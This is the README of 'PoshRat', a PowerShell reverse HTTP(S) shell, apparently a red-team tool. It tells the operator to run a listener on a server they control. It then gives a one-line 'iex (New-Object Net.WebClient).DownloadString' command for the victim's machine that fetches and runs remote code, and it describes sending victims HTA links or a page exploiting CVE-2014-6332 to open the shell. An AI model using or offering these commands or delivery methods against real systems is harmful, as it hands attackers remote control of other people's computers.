PoshRat
=======

PowerShell Reverse HTTP(s) Shell

1. Invoke PoshRat.ps1 On An A server you control.  Requires Admin rights to listen on ports.
2. To Spawn The Reverse Shell Run On Client

   iex (New-Object Net.WebClient).DownloadString("http://server/connect")
3. [OR] Browse to or send link to http://server/app.hta
4. [OR] For CVE-2014-6332 Send link to http://server/app.html

Created By Casey Smith @subTee
